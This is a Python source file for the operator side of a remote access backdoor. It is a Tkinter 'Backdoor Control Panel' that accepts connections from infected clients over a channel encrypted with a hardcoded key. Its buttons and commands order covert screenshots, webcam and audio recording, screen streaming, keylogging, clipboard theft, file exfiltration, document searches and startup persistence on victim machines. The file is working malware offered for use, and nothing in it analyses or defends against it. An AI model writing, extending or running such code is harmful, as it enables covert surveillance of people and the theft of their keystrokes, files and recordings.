#!/usr/bin/env python3
"""
gui_server.py - GUI Control Panel for AdvancedBackdoor 2026 Edition
"""

import socket
import json
import os
import base64
import threading
import time
import queue
import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox, simpledialog
from datetime import datetime

DEFAULT_PORT = 5555
BUFFER_SIZE = 4096

# ─── Encrypted channel (must match client.py) ────────────────────────────────
_SHARED_KEY = b'BackdoorKey2026!AdvancedSecurity'   # exactly 32 bytes
try:
    from cryptography.fernet import Fernet as _Fernet
    _cipher = _Fernet(base64.urlsafe_b64encode(_SHARED_KEY))
    ENCRYPTED = True
except ImportError:
    _cipher = None
    ENCRYPTED = False
# ─────────────────────────────────────────────────────────────────────────────


class BackdoorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Backdoor Control Panel 2026")
        self.root.geometry("1200x820")
        self.root.configure(bg="#1e1e2e")
        self.root.minsize(860, 620)

        self.server_socket = None
        self.server_running = False

        # cid -> {conn, addr}
        self.clients = {}
        self._clients_index = []  # parallel to listbox rows
        self.active_client_id = None
        self.client_counter = 0
        self.clients_lock = threading.Lock()

        self.ui_queue = queue.Queue()
        self.cmd_history = []
        self.history_index = -1

        self._build_ui()
        self._process_queue()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    # ─── UI layout ────────────────────────────────────────────────────────────

    def _build_ui(self):
        p = {
            "bg":      "#1e1e2e",
            "surface": "#181825",
            "overlay": "#313244",
            "text":    "#cdd6f4",
            "dim":     "#6c7086",
            "blue":    "#89b4fa",
            "green":   "#a6e3a1",
            "red":     "#f38ba8",
            "yellow":  "#f9e2af",
            "mauve":   "#cba6f7",
            "teal":    "#94e2d5",
            "peach":   "#fab387",
        }

        # ── top bar ──────────────────────────────────────────────────────────
        top = tk.Frame(self.root, bg=p["surface"], pady=5)
        top.pack(fill=tk.X)

        tk.Label(top, text="Host:", bg=p["surface"], fg=p["text"],
                 font=("Consolas", 10)).pack(side=tk.LEFT, padx=(10, 2))
        self.host_var = tk.StringVar(value="0.0.0.0")
        tk.Entry(top, textvariable=self.host_var, width=15, bg=p["overlay"],
                 fg=p["text"], insertbackground="white",
                 relief=tk.FLAT, font=("Consolas", 10)).pack(
                     side=tk.LEFT, padx=2, ipady=2)

        tk.Label(top, text="Port:", bg=p["surface"], fg=p["text"],
                 font=("Consolas", 10)).pack(side=tk.LEFT, padx=(8, 2))
        self.port_var = tk.StringVar(value=str(DEFAULT_PORT))
        tk.Entry(top, textvariable=self.port_var, width=7, bg=p["overlay"],
                 fg=p["text"], insertbackground="white",
                 relief=tk.FLAT, font=("Consolas", 10)).pack(
                     side=tk.LEFT, padx=2, ipady=2)

        self.start_btn = tk.Button(
            top, text="▶  Start", command=self.start_server,
            bg=p["green"], fg=p["surface"], font=("Consolas", 10, "bold"),
            relief=tk.FLAT, padx=12, cursor="hand2")
        self.start_btn.pack(side=tk.LEFT, padx=(14, 4), pady=2)

        self.stop_btn = tk.Button(
            top, text="■  Stop", command=self.stop_server,
            bg=p["red"], fg=p["surface"], font=("Consolas", 10, "bold"),
            relief=tk.FLAT, padx=12, cursor="hand2", state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=4, pady=2)

        self.status_lbl = tk.Label(
            top, text="● Offline", bg=p["surface"], fg=p["red"],
            font=("Consolas", 10, "bold"))
        self.status_lbl.pack(side=tk.LEFT, padx=16)

        enc_color = p["green"] if ENCRYPTED else p["dim"]
        enc_text  = "🔒 Encrypted" if ENCRYPTED else "🔓 Plaintext"
        tk.Label(top, text=enc_text, bg=p["surface"], fg=enc_color,
                 font=("Consolas", 9)).pack(side=tk.RIGHT, padx=12)

        # ── main pane ────────────────────────────────────────────────────────
        pane = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg=p["bg"],
                              sashwidth=4, sashrelief=tk.FLAT)
        pane.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        # left: client list
        left = tk.Frame(pane, bg=p["surface"], width=230)
        pane.add(left, minsize=180)

        tk.Label(left, text="CONNECTED CLIENTS", bg=p["surface"], fg=p["blue"],
                 font=("Consolas", 8, "bold")).pack(anchor="w", padx=8,
                                                     pady=(8, 2))
        self.client_lb = tk.Listbox(
            left, bg=p["overlay"], fg=p["text"],
            selectbackground=p["blue"], selectforeground=p["surface"],
            font=("Consolas", 9), relief=tk.FLAT, borderwidth=0,
            activestyle="none", highlightthickness=0)
        self.client_lb.pack(fill=tk.BOTH, expand=True, padx=6, pady=4)
        self.client_lb.bind("<<ListboxSelect>>", self._on_client_select)

        tk.Button(left, text="Disconnect", command=self.disconnect_client,
                  bg=p["red"], fg=p["surface"], font=("Consolas", 9, "bold"),
                  relief=tk.FLAT, cursor="hand2").pack(
                      fill=tk.X, padx=6, pady=(0, 6))

        # right: terminal
        right = tk.Frame(pane, bg=p["bg"])
        pane.add(right, minsize=560)

        hdr = tk.Frame(right, bg=p["surface"])
        hdr.pack(fill=tk.X)
        self.session_lbl = tk.Label(
            hdr, text="— no client selected —",
            bg=p["surface"], fg=p["green"],
            font=("Consolas", 9, "bold"), anchor="w")
        self.session_lbl.pack(side=tk.LEFT, padx=8, pady=4)
        tk.Button(hdr, text="Clear", command=self.clear_output,
                  bg=p["overlay"], fg=p["text"], font=("Consolas", 8),
                  relief=tk.FLAT, cursor="hand2", padx=8).pack(
                      side=tk.RIGHT, padx=8, pady=3)

        self.out = scrolledtext.ScrolledText(
            right, bg=p["bg"], fg=p["text"], font=("Consolas", 10),
            relief=tk.FLAT, state=tk.DISABLED, wrap=tk.WORD,
            insertbackground="white", highlightthickness=0)
        self.out.pack(fill=tk.BOTH, expand=True, padx=4, pady=(4, 2))

        for tag, color in [
            ("ok",    p["green"]),
            ("err",   p["red"]),
            ("info",  p["blue"]),
            ("cmd",   p["yellow"]),
            ("sys",   p["mauve"]),
            ("dim",   p["dim"]),
            ("data",  p["text"]),
            ("teal",  p["teal"]),
            ("peach", p["peach"]),
        ]:
            self.out.tag_config(tag, foreground=color)

        # ── quick-action button grid ──────────────────────────────────────────
        qa = tk.LabelFrame(right, text=" Quick Actions ", bg=p["bg"],
                           fg=p["blue"], font=("Consolas", 8, "bold"),
                           relief=tk.GROOVE, bd=1)
        qa.pack(fill=tk.X, padx=4, pady=2)

        # Each tuple: (label, callback, color-key)
        _d  = p["overlay"]   # default button bg
        _g  = "#2a3d2a"      # green-tinted bg for capture
        _b  = "#1e2a3d"      # blue-tinted bg for system
        _y  = "#3d3422"      # yellow-tinted bg for surveillance
        _r  = "#3d1e2a"      # red-tinted bg for danger ops
        _t  = "#1e3d3a"      # teal bg for new 2026 features

        actions = [
            # Row 0 — capture
            ("Screenshot",      self.cmd_screenshot,        _g),
            ("Webcam Snap",     self.cmd_webcam,            _g),
            ("Webcam Video",    self.cmd_webcam_video,      _g),
            ("Audio Record",    self.cmd_audio_record,      _g),
            ("Screen Stream",   self.cmd_screen_stream,     _g),
            # Row 1 — system info
            ("Sysinfo",         self.cmd_sysinfo,           _b),
            ("Sysmon",          self.cmd_sysmon,            _b),
            ("Proc List",       self.cmd_ps,                _b),
            ("Kill PID",        self.cmd_kill,              _r),
            ("Netstat",         self.cmd_netstat,           _b),
            # Row 2 — surveillance
            ("Keylog Start",    self.cmd_keylog_start,      _y),
            ("Keylog Stop",     self.cmd_keylog_stop,       _y),
            ("Keylog Dump",     self.cmd_keylog_dump,       _y),
            ("Clipboard Get",   self.cmd_clipboard,         _y),
            ("Clipboard Set",   self.cmd_clipboard_set,     _y),
            # Row 3 — file / misc
            ("Download",        self.cmd_download,          _t),
            ("Upload",          self.cmd_upload,            _t),
            ("File Search",     self.cmd_filesearch,        _t),
            ("Active Window",   self.cmd_active_window,     _t),
            ("Env Vars",        self.cmd_env,               _t),
            # Row 4 — persistence / misc
            ("Persist Add",     self.cmd_persist_add,       _r),
            ("Persist Remove",  self.cmd_persist_remove,    _r),
            ("Help",            self.cmd_help,              _d),
            ("Active Win",      self.cmd_active_window,     _d),
        ]

        COLS = 5
        for i, (label, cb, bg) in enumerate(actions):
            tk.Button(qa, text=label, command=cb,
                      bg=bg, fg=p["text"], font=("Consolas", 8),
                      relief=tk.FLAT, padx=4, pady=3,
                      cursor="hand2").grid(
                          row=i // COLS, column=i % COLS,
                          padx=2, pady=2, sticky="ew")

        for c in range(COLS):
            qa.grid_columnconfigure(c, weight=1)

        # ── command input ─────────────────────────────────────────────────────
        inp = tk.Frame(right, bg=p["surface"])
        inp.pack(fill=tk.X, padx=4, pady=(2, 6))

        self.prompt_lbl = tk.Label(
            inp, text="backdoor> ", bg=p["surface"], fg=p["yellow"],
            font=("Consolas", 10, "bold"))
        self.prompt_lbl.pack(side=tk.LEFT, padx=(4, 0))

        self.cmd_entry = tk.Entry(
            inp, bg=p["overlay"], fg=p["text"],
            insertbackground="white", font=("Consolas", 10),
            relief=tk.FLAT, highlightthickness=0)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)
        self.cmd_entry.bind("<Return>", self.send_command)
        self.cmd_entry.bind("<Up>",     self._hist_up)
        self.cmd_entry.bind("<Down>",   self._hist_down)

        tk.Button(inp, text="Send", command=self.send_command,
                  bg=p["blue"], fg=p["surface"],
                  font=("Consolas", 10, "bold"), relief=tk.FLAT,
                  padx=14, cursor="hand2").pack(side=tk.LEFT, pady=2)

    # ─── Thread-safe queue ────────────────────────────────────────────────────

    def _process_queue(self):
        try:
            while True:
                item = self.ui_queue.get_nowait()
                op = item[0]
                if op == "log":
                    self._write(item[1], item[2])
                elif op == "add_client":
                    _, cid, label = item
                    self.client_lb.insert(tk.END, label)
                    self._clients_index.append(cid)
                elif op == "del_client":
                    _, cid = item
                    if cid in self._clients_index:
                        idx = self._clients_index.index(cid)
                        self.client_lb.delete(idx)
                        self._clients_index.pop(idx)
                    if self.active_client_id == cid:
                        self.active_client_id = None
                        self.session_lbl.config(text="— no client selected —")
                        self.prompt_lbl.config(text="backdoor> ")
        except queue.Empty:
            pass
        self.root.after(80, self._process_queue)

    def _write(self, text, tag="data"):
        self.out.configure(state=tk.NORMAL)
        ts = datetime.now().strftime("%H:%M:%S")
        self.out.insert(tk.END, f"[{ts}] ", "dim")
        self.out.insert(tk.END, text + "\n", tag)
        self.out.configure(state=tk.DISABLED)
        self.out.see(tk.END)

    def log(self, text, tag="data"):
        self.ui_queue.put(("log", text, tag))

    def clear_output(self):
        self.out.configure(state=tk.NORMAL)
        self.out.delete(1.0, tk.END)
        self.out.configure(state=tk.DISABLED)

    # ─── Server start / stop ──────────────────────────────────────────────────

    def start_server(self):
        host = self.host_var.get().strip() or "0.0.0.0"
        try:
            port = int(self.port_var.get().strip())
        except ValueError:
            messagebox.showerror("Invalid Port", "Port must be a number.")
            return

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
        except Exception as e:
            messagebox.showerror("Bind Failed", str(e))
            self.server_socket.close()
            return

        self.server_running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_lbl.config(text=f"● {host}:{port}", fg="#a6e3a1")
        self._write(f"Server listening on {host}:{port}"
                    f"  |  encrypted={ENCRYPTED}", "ok")

        threading.Thread(target=self._accept_loop, daemon=True).start()

    def stop_server(self):
        self.server_running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass

        with self.clients_lock:
            for info in self.clients.values():
                try:
                    info["conn"].close()
                except Exception:
                    pass
            self.clients.clear()

        self.client_lb.delete(0, tk.END)
        self._clients_index.clear()
        self.active_client_id = None
        self.session_lbl.config(text="— no client selected —")
        self.prompt_lbl.config(text="backdoor> ")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_lbl.config(text="● Offline", fg="#f38ba8")
        self._write("Server stopped.", "err")

    def _accept_loop(self):
        while self.server_running:
            try:
                self.server_socket.settimeout(1.0)
                conn, addr = self.server_socket.accept()
            except socket.timeout:
                continue
            except Exception:
                break

            with self.clients_lock:
                self.client_counter += 1
                cid = self.client_counter
                self.clients[cid] = {"conn": conn, "addr": addr}

            label = f"#{cid}  {addr[0]}:{addr[1]}"
            self.ui_queue.put(("add_client", cid, label))
            self.log(f"New connection #{cid}  {addr[0]}:{addr[1]}", "ok")

    # ─── Client management ────────────────────────────────────────────────────

    def _on_client_select(self, _event=None):
        sel = self.client_lb.curselection()
        if not sel:
            return
        idx = sel[0]
        if idx >= len(self._clients_index):
            return
        cid = self._clients_index[idx]
        with self.clients_lock:
            info = self.clients.get(cid)
        if not info:
            return
        self.active_client_id = cid
        addr = info["addr"]
        self.session_lbl.config(
            text=f"Client #{cid}  —  {addr[0]}:{addr[1]}")
        self.prompt_lbl.config(text=f"backdoor[{addr[0]}]> ")
        self.log(f"Active client: #{cid} ({addr[0]}:{addr[1]})", "info")

    def disconnect_client(self):
        cid = self.active_client_id
        if cid is None:
            messagebox.showinfo("No Client", "Select a client from the list.")
            return
        with self.clients_lock:
            info = self.clients.pop(cid, None)
        if info:
            try:
                self._send(info["conn"], "quit")
                info["conn"].close()
            except Exception:
                pass
        self.ui_queue.put(("del_client", cid))
        self.log(f"Client #{cid} disconnected.", "err")

    # ─── Encrypted socket helpers ─────────────────────────────────────────────

    def _send(self, conn, data):
        try:
            payload = json.dumps(data).encode()
            if ENCRYPTED and _cipher:
                token = _cipher.encrypt(payload)
                payload = json.dumps({"e": token.decode()}).encode()
            conn.sendall(payload)
        except Exception as e:
            self.log(f"Send error: {e}", "err")

    def _recv(self, conn):
        """Receive one JSON message, decrypt if needed."""
        buf = ""
        while True:
            try:
                chunk = conn.recv(BUFFER_SIZE).decode("utf-8", errors="replace")
                buf += chunk
                if not chunk:
                    return None
                parsed = json.loads(buf)
                if (ENCRYPTED and _cipher
                        and isinstance(parsed, dict) and "e" in parsed):
                    clear = _cipher.decrypt(parsed["e"].encode())
                    return json.loads(clear.decode())
                return parsed
            except ValueError:
                continue
            except Exception as e:
                self.log(f"Recv error: {e}", "err")
                return None

    def _recv_file(self, conn, save_path):
        """Receive raw base64 bytes terminated by <END>, decode and save."""
        raw = b""
        while True:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                break
            if b"<END>" in chunk:
                raw += chunk.replace(b"<END>", b"")
                break
            raw += chunk
        try:
            decoded = base64.b64decode(raw)
            with open(save_path, "wb") as f:
                f.write(decoded)
            self.log(f"Saved: '{save_path}'  ({len(decoded):,} bytes)", "ok")
            return True
        except Exception as e:
            self.log(f"File save error: {e}", "err")
            return False

    def _send_file(self, conn, file_path):
        """Send a local file as base64 bytes followed by <END>."""
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            conn.sendall(base64.b64encode(data))
            time.sleep(0.3)
            conn.sendall(b"<END>")
            self.log(f"Sent: '{file_path}'  ({len(data):,} bytes)", "ok")
        except Exception as e:
            self.log(f"File send error: {e}", "err")

    # ─── Command dispatch ─────────────────────────────────────────────────────

    def _active_conn(self):
        if self.active_client_id is None:
            messagebox.showinfo("No Client", "Select a client first.")
            return None
        with self.clients_lock:
            info = self.clients.get(self.active_client_id)
        if info is None:
            messagebox.showinfo("Disconnected", "Client is no longer connected.")
            return None
        return info["conn"]

    def send_command(self, _event=None):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        conn = self._active_conn()
        if conn is None:
            return
        self.cmd_entry.delete(0, tk.END)
        self.cmd_history.append(cmd)
        self.history_index = -1
        self.log(f">> {cmd}", "cmd")
        threading.Thread(
            target=self._dispatch,
            args=(conn, self.active_client_id, cmd),
            daemon=True).start()

    def _dispatch(self, conn, cid, cmd):
        try:
            self._run(conn, cid, cmd)
        except Exception as e:
            self.log(f"Error: {e}", "err")

    def _run(self, conn, cid, cmd):  # noqa: C901
        # ── download <file> — pull file FROM client ───────────────────────────
        if cmd.startswith("download "):
            file_name = cmd[9:].strip()
            self._send(conn, cmd)
            msg = self._recv(conn)   # "[UPLOAD]..." or "[ERROR]..."
            if msg:
                self.log(str(msg), "info" if "[UPLOAD]" in str(msg) else "err")
            if msg and "[UPLOAD]" in str(msg):
                self._recv_file(conn, file_name)

        # ── upload <file> — push file TO client ───────────────────────────────
        elif cmd.startswith("upload "):
            file_path = cmd[7:].strip()
            if not os.path.exists(file_path):
                self.log(f"Local file not found: '{file_path}'", "err")
                return
            self._send(conn, cmd)
            ready = self._recv(conn)          # "[*] Ready to receive..."
            if ready:
                self.log(str(ready), "info")
            self._send_file(conn, file_path)
            result = self._recv(conn)         # "[DOWNLOAD] File saved..."
            if result:
                self.log(str(result),
                         "ok" if "[DOWNLOAD]" in str(result) else "err")

        # ── screenshot ───────────────────────────────────────────────────────
        elif cmd == "screenshot":
            self._send(conn, cmd)
            status = self._recv(conn)          # "[+]..." or "[-]..."
            if status:
                self.log(str(status), "ok" if "[+]" in str(status) else "err")
            if status and "[+]" in str(status):
                up = self._recv(conn)          # "[UPLOAD]..."
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"screenshot_{int(time.time())}.png")

        # ── webcam ───────────────────────────────────────────────────────────
        elif cmd == "webcam":
            self._send(conn, cmd)
            status = self._recv(conn)
            if status:
                self.log(str(status), "ok" if "[+]" in str(status) else "err")
            if status and "[+]" in str(status):
                up = self._recv(conn)
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"webcam_{int(time.time())}.jpg")

        # ── webcam_video ─────────────────────────────────────────────────────
        elif cmd.startswith("webcam_video"):
            self._send(conn, cmd)
            rec = self._recv(conn)             # "[*] Recording..."
            if rec:
                self.log(str(rec), "info")
            done = self._recv(conn)            # "[+]..." or "[-]..."
            if done:
                self.log(str(done), "ok" if "[+]" in str(done) else "err")
            if done and "[+]" in str(done):
                up = self._recv(conn)
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"webcam_video_{int(time.time())}.avi")

        # ── NEW: audio_record ─────────────────────────────────────────────────
        elif cmd.startswith("audio_record"):
            self._send(conn, cmd)
            rec = self._recv(conn)             # "[*] Recording audio..."
            if rec:
                self.log(str(rec), "info")
            done = self._recv(conn)            # "[+]..." or "[-]..."
            if done:
                self.log(str(done), "ok" if "[+]" in str(done) else "err")
            if done and "[+]" in str(done):
                up = self._recv(conn)
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"audio_{int(time.time())}.wav")

        # ── NEW: screen_stream ────────────────────────────────────────────────
        elif cmd.startswith("screen_stream"):
            parts = cmd.split()
            count = 5
            if len(parts) > 1:
                try:
                    count = int(parts[1])
                except Exception:
                    pass
            self._send(conn, cmd)
            init = self._recv(conn)            # "[*] Starting stream..."
            if init:
                self.log(str(init), "info")

            for i in range(count):
                frame_msg = self._recv(conn)   # "[STREAM] Frame i/n" or failed
                if frame_msg:
                    self.log(str(frame_msg), "teal")
                if frame_msg and "[STREAM]" in str(frame_msg) \
                        and "failed" not in str(frame_msg).lower():
                    up = self._recv(conn)      # "[UPLOAD]..."
                    if up:
                        self.log(str(up), "info")
                    fname = f"stream_{int(time.time())}_{i + 1:02d}.png"
                    self._recv_file(conn, fname)

            end = self._recv(conn)             # "[STREAM_END]"
            if end:
                self.log(str(end), "ok")

        # ── quit ─────────────────────────────────────────────────────────────
        elif cmd == "quit":
            self._send(conn, cmd)
            with self.clients_lock:
                self.clients.pop(cid, None)
            self.ui_queue.put(("del_client", cid))
            self.log(f"Client #{cid} disconnected.", "err")

        # ── everything else (generic JSON response commands) ──────────────────
        else:
            self._send(conn, cmd)
            response = self._recv(conn)
            if response is not None:
                self.log(str(response), "data")
            else:
                self.log("Connection lost.", "err")
                with self.clients_lock:
                    self.clients.pop(cid, None)
                self.ui_queue.put(("del_client", cid))

    # ─── Command history ──────────────────────────────────────────────────────

    def _hist_up(self, _=None):
        if not self.cmd_history:
            return
        self.history_index = min(self.history_index + 1,
                                  len(self.cmd_history) - 1)
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, self.cmd_history[-(self.history_index + 1)])

    def _hist_down(self, _=None):
        if self.history_index <= 0:
            self.history_index = -1
            self.cmd_entry.delete(0, tk.END)
            return
        self.history_index -= 1
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, self.cmd_history[-(self.history_index + 1)])

    # ─── Quick-action button helpers ──────────────────────────────────────────

    def _quick(self, cmd):
        conn = self._active_conn()
        if conn is None:
            return
        self.log(f">> {cmd}", "cmd")
        self.cmd_history.append(cmd)
        threading.Thread(
            target=self._dispatch,
            args=(conn, self.active_client_id, cmd),
            daemon=True).start()

    # ── capture ───────────────────────────────────────────────────────────────
    def cmd_screenshot(self):   self._quick("screenshot")
    def cmd_webcam(self):       self._quick("webcam")

    def cmd_webcam_video(self):
        dur = simpledialog.askinteger(
            "Webcam Video", "Duration (seconds):",
            initialvalue=10, minvalue=1, maxvalue=300, parent=self.root)
        if dur:
            self._quick(f"webcam_video {dur}")

    def cmd_audio_record(self):
        dur = simpledialog.askinteger(
            "Audio Record", "Duration (seconds):",
            initialvalue=10, minvalue=1, maxvalue=300, parent=self.root)
        if dur:
            self._quick(f"audio_record {dur}")

    def cmd_screen_stream(self):
        n = simpledialog.askinteger(
            "Screen Stream", "Number of frames to capture:",
            initialvalue=5, minvalue=1, maxvalue=60, parent=self.root)
        if n:
            self._quick(f"screen_stream {n}")

    # ── system ────────────────────────────────────────────────────────────────
    def cmd_sysinfo(self):      self._quick("sysinfo")
    def cmd_sysmon(self):       self._quick("sysmon")
    def cmd_ps(self):           self._quick("ps")
    def cmd_netstat(self):      self._quick("netstat")
    def cmd_env(self):          self._quick("env")
    def cmd_active_window(self): self._quick("active_window")

    def cmd_kill(self):
        pid = simpledialog.askinteger(
            "Kill Process", "Enter PID to kill:",
            minvalue=1, parent=self.root)
        if pid:
            self._quick(f"kill {pid}")

    # ── surveillance ──────────────────────────────────────────────────────────
    def cmd_keylog_start(self): self._quick("keylog_start")
    def cmd_keylog_stop(self):  self._quick("keylog_stop")
    def cmd_keylog_dump(self):  self._quick("keylog_dump")
    def cmd_clipboard(self):    self._quick("clipboard")

    def cmd_clipboard_set(self):
        text = simpledialog.askstring(
            "Set Clipboard", "Text to write to clipboard:",
            parent=self.root)
        if text:
            self._quick(f"clipboard_set {text}")

    # ── file ──────────────────────────────────────────────────────────────────
    def cmd_download(self):
        path = simpledialog.askstring(
            "Download from Client", "Remote file path on client machine:",
            parent=self.root)
        if path:
            self._quick(f"download {path}")

    def cmd_upload(self):
        path = filedialog.askopenfilename(
            title="Select file to upload to client", parent=self.root)
        if path:
            self._quick(f"upload {path}")

    def cmd_filesearch(self):
        ext = simpledialog.askstring(
            "File Search", "Extension to search for (e.g. .docx):",
            initialvalue=".docx", parent=self.root)
        if not ext:
            return
        directory = simpledialog.askstring(
            "File Search", "Directory to search (leave blank for home dir):",
            parent=self.root)
        cmd = f"filesearch {ext}"
        if directory:
            cmd += f" {directory}"
        self._quick(cmd)

    # ── persistence ───────────────────────────────────────────────────────────
    def cmd_persist_add(self):
        if messagebox.askyesno("Persistence",
                                "Add startup persistence on client?",
                                parent=self.root):
            self._quick("persistence_add")

    def cmd_persist_remove(self):
        self._quick("persistence_remove")

    # ── misc ──────────────────────────────────────────────────────────────────
    def cmd_help(self):         self._quick("help")

    # ─── Cleanup ─────────────────────────────────────────────────────────────

    def _on_close(self):
        if self.server_running:
            self.stop_server()
        self.root.destroy()


def main():
    root = tk.Tk()
    BackdoorGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
